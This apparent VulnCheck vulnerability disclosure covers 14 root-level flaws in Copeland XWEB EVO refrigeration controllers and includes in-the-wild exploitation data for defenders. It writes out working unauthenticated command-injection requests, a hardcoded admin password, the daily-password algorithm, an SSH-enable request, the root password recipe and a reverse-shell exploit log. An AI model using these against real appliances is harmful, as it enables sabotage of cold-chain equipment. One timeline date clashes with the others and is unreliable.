---
title: "Code of the Day: Unauthenticated Root in Copeland XWEB EVO"
source: https://www.vulncheck.com/blog/copeland-xweb-evo-unauthenticated-root
source_host: www.vulncheck.com
clip_date: 2026-11-19T08:24:33+08:00
trace_id: e20c0bde-5b50-4265-9184-e602b1450e83
content_hash: 309fc9633ab7fe06ae14affc62cadba0ad6bd985ca167d29849d7288af4e9fa5
status: synced
tags: []
series: null
feed_source: VulnCheck·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-813f-844c-dd70fe220db9
ioc:
  cves:
    - CVE-2026-124002
    - CVE-2026-124003
    - CVE-2026-124004
    - CVE-2026-124005
    - CVE-2026-124006
    - CVE-2026-124007
    - CVE-2026-124008
    - CVE-2026-124009
    - CVE-2026-124010
    - CVE-2026-124011
    - CVE-2026-124012
    - CVE-2026-124013
    - CVE-2026-124014
    - CVE-2026-124015
  cwes:
    - CWE-1392
    - CWE-200
    - CWE-250
    - CWE-287
    - CWE-306
    - CWE-330
    - CWE-640
    - CWE-78
    - CWE-798
    - CWE-862
  hashes: []
  domains: []
  tools: []
  techniques: []
---

Today VulnCheck is disclosing 14 vulnerabilities in [XWEB EVO](https://www.copeland.com/), the Dixell refrigeration supervisor now sold under Copeland (Emerson). They are being disclosed in accordance with VulnCheck's [coordinated vulnerability disclosure policy](https://vulncheck.com/vulnerability-disclosure-policy), and all 14 carry allocated IDs through the VulnCheck CNA. Every one was proven to `uid=0(root)` against appliance labs rebuilt from the vendor's firmware.

Two of them are under active exploitation. The only public artifact for [CVE-2026-124014](https://console.vulncheck.com/cve/CVE-2026-124014), the unauthenticated `config.lua` configuration write, was the NVD record, which went live at 2026-11-12 20:18 UTC as a one-paragraph description with no exploit, and no public proof-of-concept existed. By 22:00 UTC, an hour and forty minutes later, VulnCheck's canary sensors were recording in-the-wild exploitation of it, 87 hits in the first hour from a single source, and VulnCheck added it to VulnCheck KEV the same day, ahead of any other KEV source. At 03:41 UTC the next morning, a second source began probing [CVE-2026-124010](https://console.vulncheck.com/cve/CVE-2026-124010), the unauthenticated root command execution, and VulnCheck added that vulnerability to VulnCheck KEV on November 13. What the canaries actually saw is detailed below.

On the pre-2021 `.lua` -era builds (this whole class was removed in the 2021 rewrite, so it is fixed on the current branch but lives on across the legacy fleet that is still most of what is exposed):

-   [CVE-2026-124010](https://console.vulncheck.com/cve/CVE-2026-124010): one unauthenticated GET to the setuid-root CGI `xwconsole.cgi` runs the `sh` parameter as a root command (CWE-78, CWE-306, CWE-250), the second flaw VulnCheck canaries saw exploited in the wild.
-   [CVE-2026-124002](https://console.vulncheck.com/cve/CVE-2026-124002): OS command injection in the `login.lua` `username` field, before the password check (CWE-78, CWE-306).
-   [CVE-2026-124007](https://console.vulncheck.com/cve/CVE-2026-124007): the same, through the `password` field for hashed-mode accounts (CWE-78).
-   [CVE-2026-124004](https://console.vulncheck.com/cve/CVE-2026-124004): a hardcoded backdoor password for the Administrator account (CWE-798).
-   [CVE-2026-124003](https://console.vulncheck.com/cve/CVE-2026-124003): the `wlua` Lua interpreter is setuid root, which turns every one of those injections into a root injection (CWE-250).
-   [CVE-2026-124008](https://console.vulncheck.com/cve/CVE-2026-124008): authenticated command injection in the `devices.lua` template handler (CWE-78).
-   [CVE-2026-124009](https://console.vulncheck.com/cve/CVE-2026-124009): authenticated command injection in the `backup.lua` mount handler (CWE-78).
-   [CVE-2026-124014](https://console.vulncheck.com/cve/CVE-2026-124014): unauthenticated write of the system configuration file via `config.lua` (CWE-306, CWE-862), the flaw VulnCheck canaries saw exploited in the wild.
-   [CVE-2026-124015](https://console.vulncheck.com/cve/CVE-2026-124015): a session-bypass password reset in `users.lua` (CWE-306, CWE-640).

Predictable credentials and the import sink that survive the rewrite and reach the current firmware (5.8.8, end-of-support):

-   [CVE-2026-124005](https://console.vulncheck.com/cve/CVE-2026-124005): the "code of the day" admin password is a secret-free function of the device MAC and the date (CWE-330, CWE-287).
-   [CVE-2026-124011](https://console.vulncheck.com/cve/CVE-2026-124011): `sysinfo.lua` leaks that MAC and the clock to any unauthenticated caller (CWE-200).
-   [CVE-2026-124012](https://console.vulncheck.com/cve/CVE-2026-124012): the Administrator account logs in with the daily password alone, no stored secret (CWE-798, CWE-287).
-   [CVE-2026-124006](https://console.vulncheck.com/cve/CVE-2026-124006): the Linux root password is rebuilt daily as a fixed prefix plus that same daily (CWE-798, CWE-1392).
-   [CVE-2026-124013](https://console.vulncheck.com/cve/CVE-2026-124013): authenticated command injection in the `api.lua` `import_preconfiguration` action (CWE-78).

The most severe is [CVE-2026-124010](https://console.vulncheck.com/cve/CVE-2026-124010), a single unauthenticated GET that lands `uid=0(root)` with the command output in the response body. The whole set was reproduced end to end against two appliance labs rebuilt from the vendor's firmware: a native i386 build of `5.2.3.STANDARD` for the legacy sinks, and the ARM `5.8.8.STANDARD` firmware under emulation for the credential path that reaches the current release.

## Why this box

On the night of 11-12 October 2026, an attacker reached the refrigeration controllers of roughly 700 French supermarkets over the public internet and forced them into defrost overnight. Cabinet temperatures climbed, stock rotted, and in at least 15 stores the overloaded units caught fire. CERT-FR named four controller families as compromised, the Danfoss AK-SC and AK-SM series and Copeland and Dixell XWEB ([CERTFR-2026-ALE-012](https://cert.cyber.gouv.fr/alerte/CERTFR-2026-ALE-012/)), so this product was already in the target set. The controllers exposed a web server to the public internet, and on the XWEB side of that fleet the way in is almost insulting: the username `admin` and a password that is just the current date, the "code of the day" this post pulls apart. On 9 November 2026 France attributed the campaign to Iran's IRGC cyber unit *Shahid Kaveh* ([French MFA declaration](https://www.diplomatie.gouv.fr/fr/presse-et-ressources/decouvrir-et-informer/actualites/declaration-d-attribution-a-l-iran-de-cyberattaques-visant-la-france)).

The reporting named more than one vendor. Danfoss was one. Dixell / Copeland was the other. I had already taken the Danfoss side apart, so the obvious question was the competitor's box: if one refrigeration supervisor shipped a date-as-password login, what does the other one look like? XWEB EVO is that competitor, the appliance that sits in a supermarket back office and drives the whole refrigeration estate. It is worse than a weak daily code. The login page runs the submitted username as a shell command before it ever checks the password.

## Reading the firmware

None of this is black-box. The XWEB EVO firmware is distributed through Copeland's update portal, and the application layer inside it is only lightly obfuscated. The update zip carries the app package as an RPM (`EVOPackage-5.2.3.STANDARD.5-bbfd5b.i686.rpm`) XOR'd with a 20-byte repeating key. That key is trivial to recover: an RPM starts with the fixed lead magic `ED AB EE DB`, and the package name sits in plaintext a few bytes in, so XORing the known header against the ciphertext hands back the key and the key repeats for the rest of the file. Decoded, it is a valid RPM, and `rpm2cpio | xz | cpio` lays out a Fedora 15 i686 application rootfs: Apache, the firmware's Lua CGIs, and the setuid-root `wlua` interpreter and compiled CGIs behind them.

The current 5.8.8 firmware ships as an `.epkg` instead of an RPM, but it decodes with the same technique: the same repeating XOR, the key drifting a byte or two per build and recovered the same way, unwraps to a shell script and a gzip stream, then a squashfs image (`hsqs`) and an `EVOPackage.tar` with the app rootfs. From there both builds were rebuilt into appliance labs (native i386 for `5.2.3`, qemu-emulated ARM for `5.8.8`), and every sink, HTTP request and credential recipe in this post comes from reading that recovered source and firing it against a running lab, not from inference.

## The login that shells you before it checks you

The login injection is [CVE-2026-124002](https://console.vulncheck.com/cve/CVE-2026-124002). `login.lua` (`action=login`) resolves a submitted username by shelling out to `find`, concatenating the raw parameter into the command with no escaping:

```lua
-- login.lua, action=login: username spliced into a shell command before any password check
for filename in io.popen('find /opt/setup/users/ -maxdepth 2 -type f -name "'..tostring(username)..'"'):lines() do
```

`CGI.parse` only URL-decodes, so a username of `";<command>;echo "` closes the `find` quotes and runs the attacker's command. The sink is on the path to the `INVALID_USERNAME` branch, so it fires before any password is checked. No session, no credential:

```md
GET /cgi-bin/login.lua?action=login&password=x&username=%22;id;echo%20%22 HTTP/1.1
Host: target
```

That alone is an Apache-user foothold. What makes it root is [CVE-2026-124003](https://console.vulncheck.com/cve/CVE-2026-124003): the interpreter the appliance runs its Lua CGIs through, `/opt/xweb/bin/tools/wlua`, is setuid root, and its `main` is literally:

```c
// /opt/xweb/bin/tools/wlua, SUID root (recovered with r2ghidra)
setuid(0);                        // honoured when wlua is execve'd directly
system("/usr/bin/lua " + argv);   // argv concatenated unsanitised, via /bin/sh
```

Through the Apache CGI shebang the setuid bit is dropped, so the injection above lands as `www-data`; but from that foothold a payload that re-invokes `wlua` on a temp Lua file honours the setuid and runs as root. Every command sink reachable inside a `.lua` is therefore a root sink, and the `system()` of unsanitised argv is a root command-injection primitive in its own right.

If an attacker does not want to bother with a payload, [CVE-2026-124010](https://console.vulncheck.com/cve/CVE-2026-124010) is the single-request version. `xwconsole.cgi` is a compiled setuid-root CGI that Apache execs directly (so the setuid is honoured, unlike the `.lua` shebang path), carries no session check, and runs the raw `sh` request parameter through `popen()`:

```c
// xwconsole.cgi, a SUID-root compiled CGI, no auth
char *cmd = cgi_param("sh");   // the raw sh request parameter
popen(cmd, "r");               // executed as root, output streamed back to the client
```

One unauthenticated GET, root, output returned inline:

```md
GET /cgi-bin/xwconsole.cgi?sh=id HTTP/1.1
Host: target

->  uid=0(root) gid=33(www-data) groups=33(www-data)
```

It is one of 27 compiled CGIs on the legacy builds whose code reaches `system`, `popen` or `exec*`, and not one of them validates its input. And if that fails, there is a key under the mat: [CVE-2026-124004](https://console.vulncheck.com/cve/CVE-2026-124004), a hardcoded master password accepted for the Administrator account on every unit, with no payload at all. The daily-password check has a literal second branch:

```lua
-- login.lua: the Administrator daily_password check
local dailyPassword = io.popen('/opt/xweb/bin/tools/xwpasswd'):read()
if password == dailyPassword or password == 'xwebevonewgeneration' then passwordMatch = true
```

```md
GET /cgi-bin/login.lua?action=login&username=Administrator&password=xwebevonewgeneration HTTP/1.1
Host: target

->  {"status":"ok","user":{"id":0,"username":"Administrator","sses":"SSES...","desktops":{...,"terminal":...}}}
```

The same post-auth shape shows up in the other `.lua` CGIs, which run request parameters into `os.execute` / `io.popen` on the template and mount paths: `devices.lua` (`action=replace`, the `source` field, [CVE-2026-124008](https://console.vulncheck.com/cve/CVE-2026-124008)) and `backup.lua` (`action=backup`, the `output` field, [CVE-2026-124009](https://console.vulncheck.com/cve/CVE-2026-124009)). They need a session, but the whole `.lua` surface runs through setuid-root `wlua`, so each one lands as root once reached, through the backdoor above or the daily credential below.

## The code of the day, on hardware that will never be patched

The 2021 rewrite removed the command-injection and backdoor bugs from the modern branch. It did not remove the design that made the French fridge attack work. On XWEB EVO the Administrator "code of the day" ([CVE-2026-124005](https://console.vulncheck.com/cve/CVE-2026-124005)) is derived from the device `eth0` MAC and the current date with no server secret: the firmware binary runs a CRC-16 over the date bytes seeded by the MAC and prints that day's password, so anyone who can read the MAC computes it offline. The one unit-specific input, the MAC, is handed to any unauthenticated caller by `sysinfo.lua` ([CVE-2026-124011](https://console.vulncheck.com/cve/CVE-2026-124011)), which also feeds the pre-login page:

```md
GET /cgi-bin/sysinfo.lua HTTP/1.1
Host: target

->  {"status":"ok","info":{"id":"525400123456","release":"5.8.8.STANDARD...","timestamp":...}}
```

That MAC is the whole secret, and it is not one. The firmware's `xwpasswd` generator folds the six MAC bytes into a CRC-16 polynomial, runs the CRC over the date, and maps the result to a six-character password, with no key anywhere in the computation:

```md
poly = 0xA001 XOR (the six eth0 MAC bytes folded into three little-endian 16-bit words)
crc  = 0xFFFF
for byte in (day, month, year mod 100):
    crc ^= byte
    repeat 8 times: lsb = crc & 1; crc >>= 1; if lsb: crc ^= poly
code_of_the_day = six characters mapped from the four nibbles of crc
```

A few lines of that reproduce any unit's daily password from its MAC and the date; the firmware tries the device date and the day on either side to absorb clock and timezone skew. Derive the daily offline, and the Administrator account logs in with it unconditionally ([CVE-2026-124012](https://console.vulncheck.com/cve/CVE-2026-124012)). The SSH-enable action on `api.lua` is gated on nothing but that same daily password, no session required, so one POST starts the SSH daemon:

```md
POST /api HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=ssh&password=<daily>&target=start
```

The OS root password is then a fixed prefix plus that same daily ([CVE-2026-124006](https://console.vulncheck.com/cve/CVE-2026-124006)): a daily cron job (`/etc/cron.daily/chp`) rebuilds `/etc/shadow` as `xwebdix` concatenated with the code of the day. Leak the MAC, derive the daily, start SSH, and log in as `root` with `xwebdix<daily>`: the appliance goes from the IP alone to a root SSH session. The authenticated `api.lua` `import_preconfiguration` action ([CVE-2026-124013](https://console.vulncheck.com/cve/CVE-2026-124013)) splices its `server_username` field into a root `curl` command for a second path on the current firmware. This is the same class of weakness that drove the October attack, on Copeland's refrigeration supervisor, reaching the latest firmware. The unauthenticated `config.lua` write and `users.lua` reset are the other side of the fleet: they were dropped in the 2021 rewrite, so they live only on the legacy `.lua` builds, which is exactly where the canary exploitation of `config.lua` is landing.

That matters because the latest firmware is also the end of the line. Copeland's March 2026 bulletin declared the XWEB EVO family End-of-Software-Support: no fixes after 16 March 2026. The credential, MAC-disclosure and configuration findings that reach 5.8.8 are therefore won't-fix by the vendor's own policy, on a fleet that stays online.

## Initial Access exploit

VulnCheck's Initial Access Intelligence team turned the login sink into a self-contained [go-exploit](https://github.com/vulncheck-oss/go-exploit) module. It fingerprints the XWEB EVO UI, fires the unauthenticated `login.lua` `username` injection, drops a one-line Lua payload that re-invokes setuid-root `wlua`, and catches the connect-back as root. The only input it needs is the target address:

Every Monday, VulnCheck publishes a new exploit in the [Initial Access Community repository](https://github.com/vulncheck-oss/initial-access-community).

```md
chocapikk@pwntoaster:~/feed/cve-2026-124002$ ./build/cve-2026-124002_linux-amd64 -v -e -rhost 172.17.0.5 -rport 80 -lhost 0.0.0.0 -callback 172.17.0.1 -lport 4490 -c2 SimpleShellServer -t 6
time=2026-11-12T11:43:46.053+01:00 level=STATUS msg="Starting listener on 0.0.0.0:4490"
time=2026-11-12T11:43:46.053+01:00 level=STATUS msg="Validating Copeland XWEB 300D EVO/XWEB 500D EVO/XWEB 500 EVO target" host=172.17.0.5 port=80
time=2026-11-12T11:43:46.057+01:00 level=SUCCESS msg="Target verification succeeded!" host=172.17.0.5 port=80 verified=true
time=2026-11-12T11:43:46.102+01:00 level=SUCCESS msg="Injected the root reverse shell through login.lua (wlua)"
time=2026-11-12T11:43:46.102+01:00 level=STATUS msg="Waiting up to 6 seconds for the root reverse shell"
time=2026-11-12T11:43:46.111+01:00 level=SUCCESS msg="Caught new shell from 172.17.0.5:47482"
time=2026-11-12T11:43:46.111+01:00 level=STATUS msg="Active shell from 172.17.0.5:47482"
id
uid=0(root) gid=33(www-data) groups=33(www-data)
time=2026-11-12T11:43:47.102+01:00 level=SUCCESS msg="Exploit successfully completed" exploited=true
```

## Why 14 separate EVO IDs

The 2026 XWEB *Pro* research ([Claroty Team82](https://blog.claroty.com/team82/research/chilling-discoveries-unpacking-vulnerabilities-in-copeland-xweb-pro-controllers), [CISA ICSA-26-057-10](https://www.cisa.gov/news-events/ics-advisories/icsa-26-057-10)) covered the Pro line only. XWEB Pro is the vendor's stated evolution of XWEB EVO and shares the Lua middleware, so a few of these findings are plausibly the same bug on the EVO codebase. Confirming that requires reading the Pro source and showing it is identical, but the Pro firmware payloads are OpenSSL-encrypted, the key is not public, and a finding cannot be ruled a duplicate on source that cannot be read. VulnCheck, as CNA, therefore assigned separate EVO IDs cross-referenced to the Pro CVEs rather than silently folding them into a Pro record.

The reason this was worth doing despite the end-of-support label is exposure, and the EVO line is invisible exactly where defenders look for it. VulnCheck Target Intelligence, which fingerprints products from real scan data, has no entry for the end-of-support EVO firmware, so to that dataset it does not exist. The open scanners see it: a [Shodan query](https://www.shodan.io/search?query=http.title%3A%22XWEB%22+http.html%3A%22XWEB+EVO+Client%22) for the combined XWEB EVO fingerprint (the `XWEB` title paired with the `XWEB EVO Client` body marker, to filter out the title-only honeypots) counts roughly 1,663 hosts, and Onyphe's refrigeration-exposure survey counts about 1,960 public EVO hosts against 108 for Pro. The audited, advisory-covered product is the smaller fleet; the unaudited one that no intelligence feed tracks is what is actually on the internet.

## What the canaries are seeing

Of the 14 IDs, two now show up in the canary data: [CVE-2026-124014](https://console.vulncheck.com/cve/CVE-2026-124014), the unauthenticated `config.lua` configuration write, and [CVE-2026-124010](https://console.vulncheck.com/cve/CVE-2026-124010), the unauthenticated `xwconsole.cgi` root command execution. The other 12 have no in-the-wild hits.

### CVE-2026-124014 configuration write

All of that activity comes from one host:

-   **Source IP:** `202.61.138.117`
-   **ASN:** `AS152194`, CTG Server Limited, a commodity VPS/hosting network, geolocated to Tokyo, Japan
-   **First hit:** 2026-11-12 22:00:05 UTC, one hour and forty minutes after the NVD record went live and with no public PoC in existence
-   **Volume:** 125 hits through 2026-11-13 06:16 UTC, 87 of them inside the first hour, followed by lower-volume probing throughout the night
-   **Traffic:** plaintext HTTP, each request from a fresh ephemeral source port, every one matching the unauthenticated `config.lua` write shown above (canary rule `VULNCHECK CVE-2026-124014 Copeland XWEB EVO Unauthenticated config.lua Configuration Write Attempt`)

No botnet, named threat actor, or ransomware group is tied to this IP or to CVE-2026-124014 in VulnCheck's IOC feeds. The same host also sprayed a handful of unrelated recent CVEs, two to four probes each, across the 90-day window, which reads as an opportunistic scanner acting on a fresh advisory rather than a targeted operation.

### CVE-2026-124010 root command execution

The second source sent four probes across two bursts:

-   **Source IP:** `177.4.12.11`
-   **ASN:** `AS140227`, Hong Kong Communications International Co., Limited, geolocated to Hong Kong
-   **First hit:** 2026-11-13 03:41:20 UTC
-   **Volume:** 4 hits through 04:09:55 UTC
-   **Traffic:** plaintext HTTP GET requests for `/cgi-bin/xwconsole.cgi?sh=id`, all with the generic `Mozilla/5.0` user agent and fresh ephemeral source ports (canary rule `VULNCHECK CVE-2026-124010 Copeland XWEB EVO xwconsole.cgi Unauthenticated Root Command Execution Attempt`)

This source is an established opportunistic scanner. In the preceding 90 days, VulnCheck canaries recorded 189 requests from it across nine CVEs, including eight unrelated to XWEB, beginning on August 21. The four XWEB probes all ran only `id`, with no second-stage payload or C2 indicator in the requests.

Neither scanning source is evidence of the October refrigeration campaign that France attributed to Iran's IRGC unit *Shahid Kaveh*: that was a targeted sabotage operation, while these are opportunistic hosts acting on fresh advisories. XWEB was not a bystander to October, though. CERT-FR named Copeland and Dixell XWEB among the compromised controllers, alongside the Danfoss AK-SC and AK-SM families.

For defenders, the practical indicators are the source IPs `202.61.138.117` (AS152194) and `177.4.12.11` (AS140227), any unauthenticated POST to `config.lua`, any unauthenticated GET to `/cgi-bin/xwconsole.cgi` carrying the `sh` parameter, and the two canary rule names above.

## Timeline

| Date | Event |
| --- | --- |
| 2026-10-11/12 | The French supermarket refrigeration attack: roughly 700 stores forced into defrost, 15 fires. CERT-FR names four compromised controller families, the Danfoss AK-SC and AK-SM series plus Copeland and Dixell XWEB ([CERTFR-2026-ALE-012](https://cert.cyber.gouv.fr/alerte/CERTFR-2026-ALE-012/)) |
| 2026-10-16 | XWEB EVO audit: `5.2.3.STANDARD` and `5.8.8.STANDARD` rebuilt from the vendor's firmware, 14 findings reproduced to `uid=0(root)` |
| 2026-10-17 | The 14 findings submitted to Copeland PSIRT, 120-day disclosure window closing 2026-02-16 |
| 2026-11-09 | France attributes the October campaign to Iran's IRGC unit *Shahid Kaveh* ([French MFA declaration](https://www.diplomatie.gouv.fr/fr/presse-et-ressources/decouvrir-et-informer/actualites/declaration-d-attribution-a-l-iran-de-cyberattaques-visant-la-france)) |
| 2026-11-10 | Copeland PSIRT, citing end-of-support, defers the Pro-duplication call to VulnCheck; the 14 EVO identifiers are allocated through the VulnCheck CNA |
| 2026-11-12 20:18 UTC | Public disclosure: the CVE records go live on NVD (description only, no exploit) |
| 2026-11-12 22:00 UTC | VulnCheck canaries record in-the-wild exploitation of [CVE-2026-124014](https://console.vulncheck.com/cve/CVE-2026-124014) (`config.lua`), 1h40 after the record published and with no public PoC available, 87 hits in the first hour from a single host (`202.61.138.117`, AS152194); VulnCheck adds it to VulnCheck KEV the same day, ahead of any other source |
| 2026-11-13 | VulnCheck publishes this disclosure |
| 2026-11-13 03:41 UTC | VulnCheck canaries record exploitation attempts against [CVE-2026-124010](https://console.vulncheck.com/cve/CVE-2026-124010) (`xwconsole.cgi`), four `id` probes from a second host (`177.4.12.11`, AS140227); VulnCheck adds it to VulnCheck KEV the same day |

## Takeaway

A refrigeration supervisor is not a toy. It drives the cold chain for an entire store, it reports to no one when it is compromised, and, as October showed, pushing it into defrost is a physical-world payload with fires at the end of it. XWEB EVO ships a login that runs the username as a shell command, a setuid-root interpreter that makes every page a root context, a hardcoded master password, and a daily admin credential anyone can compute from a leaked MAC, on hardware the vendor will not patch again. Operators who still run one should treat it as a device that must never touch the public internet, segment it behind a VPN, and plan the move to a supported platform.

## About VulnCheck

VulnCheck empowers organizations to transcend the challenges of vulnerability prioritization. Our suite of solutions provides product managers, PSIRT teams, and threat hunters with the tools required for accelerated, high-precision operations and infinite efficiency.

Recognizing the industry-wide necessity for superior data velocity and accuracy, we deliver high-fidelity insights to the market. We remain committed to surfacing critical intelligence on vulnerability exploitation and emerging trends, leveraging our unique dataset to support the practitioner community.

To deepen your understanding of these threats, [VulnCheck Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) provides comprehensive coverage of global threat actors. Register for a demo to explore our intelligence today.
